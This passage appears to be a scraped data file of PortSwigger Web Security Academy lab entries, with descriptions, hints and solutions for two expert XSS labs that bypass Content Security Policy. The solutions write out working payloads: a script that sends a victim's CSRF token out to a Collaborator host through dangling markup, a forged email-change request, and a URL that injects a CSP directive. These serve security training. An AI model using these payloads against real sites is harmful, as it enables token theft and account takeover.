        "link": "/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack",
        "difficulty": "EXPERT",
        "out_of_band": True,
        "description": "Lab: Reflected XSS protected by very strict CSP, with dangling markup attack   EXPERT                                        This lab using a strict CSP that blocks outgoing requests to external web sites. To solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to hacker@evil-user.net . You must label your vector with the word \"Click\" in order to induce the simulated user to click it. For example: <a href=\"\">Click me</a> You can log in to your own account using the following credentials: wiener:peter   Note  To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.",
        "hint": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
        "solution": "Log in to the lab using the account provided above.  Examine the change email function. Observe that there is an XSS vulnerability in the email parameter.  Go to the Collaborator tab.  Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.   Back in the lab, go to the exploit server and add the following code, replacing YOUR-LAB-ID and YOUR-EXPLOIT-SERVER-ID with your lab ID and exploit server ID respectively, and replacing YOUR-COLLABORATOR-ID with the payload that you just copied from Burp Collaborator.  <script>\nif(window.name) {\n\t\tnew Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);\n\t\t} else {\n      \t\t\tlocation = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';\n}\n</script>   Click \"Store\" and then \"Deliver exploit to victim\". When the user visits the website containing this malicious script, if they click on the \"Click me\" link while they are still logged in to the lab website, their browser will send a request containing their CSRF token to your malicious website. You can then steal this CSRF token using Burp Collaborator.  Go back to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again. You should see an HTTP interaction that was initiated by the application. Select the HTTP interaction, go to the request tab, and copy the user's CSRF token.  With Burp's Intercept feature switched on, go back to the change email function of the lab and submit a request to change the email to any random address.  In Burp, go to the intercepted request and change the value of the email parameter to hacker@evil-user.net .  Right-click on the request and, from the context menu, select \"Engagement tools\" and then \"Generate CSRF PoC\". The popup shows both the request and the CSRF HTML that is generated by it. In the request, replace the CSRF token with the one that you stole from the victim earlier.  Click \"Options\" and make sure that the \"Include auto-submit script\" is activated.  Click \"Regenerate\" to update the CSRF HTML so that it contains the stolen token, then click \"Copy HTML\" to save it to your clipboard.  Drop the request and switch off the intercept feature.  Go back to the exploit server and paste the CSRF HTML into the body. You can overwrite the script that we entered earlier.  Click \"Store\" and \"Deliver exploit to victim\". The user's email will be changed to hacker@evil-user.net ."
    },
    {
        "id": "30",
        "name": "Reflected XSS protected by CSP, with CSP bypass",
        "link": "/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass",
        "difficulty": "EXPERT",
        "out_of_band": False,
        "description": "Lab: Reflected XSS protected by CSP, with CSP bypass   EXPERT                                        This lab uses CSP and contains a reflected XSS vulnerability. To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function. Please note that the intended solution to this lab is only possible in Chrome.    ACCESS THE LAB   <p class=\"no-script-lab-warning\">Launching labs may take some time, please hold on while we build your environment.</p>",
        "hint": "Enter the following into the search box:  <img src=1 onerror=alert(1)>   Observe that the payload is reflected, but the CSP prevents the script from executing.  In Burp Proxy, observe that the response contains a Content-Security-Policy header, and the report-uri directive contains a parameter called token . Because you can control the token parameter, you can inject your own CSP directives into the policy.",
        "solution": "Visit the following URL, replacing YOUR-LAB-ID with your lab ID:  https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27    The injection uses the script-src-elem directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite existing script-src rules enabling you to inject unsafe-inline , which allows you to use inline scripts."
    }
]